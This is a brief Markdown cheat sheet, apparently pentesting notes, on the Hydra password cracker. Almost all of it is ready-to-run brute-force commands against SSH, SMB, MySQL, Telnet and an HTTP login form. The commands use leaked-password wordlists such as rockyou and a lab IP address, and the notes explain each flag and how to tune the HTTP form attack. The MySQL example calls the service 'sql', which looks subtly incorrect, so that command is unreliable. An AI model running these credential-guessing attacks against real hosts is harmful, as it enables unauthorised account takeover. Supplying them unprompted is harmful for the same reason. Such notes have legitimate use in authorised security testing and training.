# Hydra
Hydra is a network-based password cracker.

### SSH
```shell
$ hydra 192.168.99.22 ssh \
> -L /usr/share/ncrack/minimal.usr \
> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt \
> -f -v -t 8
```
* "-L" for username list
* "-P" for password list
* "-f" for exiting the program once one working credential is found
* "-t 8" for specifying the number of parallel task to run; recommended 4 for SSH

### SMB
```shell
$ hydra -L users.txt -P /usr/share/john/password.lst <ip> smb
```
* users.txt should be a list of usernames discovered on the host
* if only brute forcing one single user, use `-l username`

### MySQL
```shell
$ hydra 192.168.99.22 sql -s <non-default port> \
> -L /usr/share/ncrack/minimal.usr \
> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt
```

### Telnet
```shell
$ hydra telnet://192.168.99.22 \
> -L /usr/share/ncrack/minimal.usr \
> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt
```

telnet log in: `$ telnet 192.168.99.22 -l <username>`

### HTTP form
```
$ hydra <url> http-post-form "/login.php:user=^USER^&pass=^PASS^:incorrect credentials" \
> -L /usr/share/ncrack/minimal.usr \
> -P /usr/share/seclists/Passwords/rockyou-15.txt \
> -f -v
```
* replace user and pass with the "name=..." in the HTML form
* replace "incorrect credentials" with the wordings used with failed log-on attempts
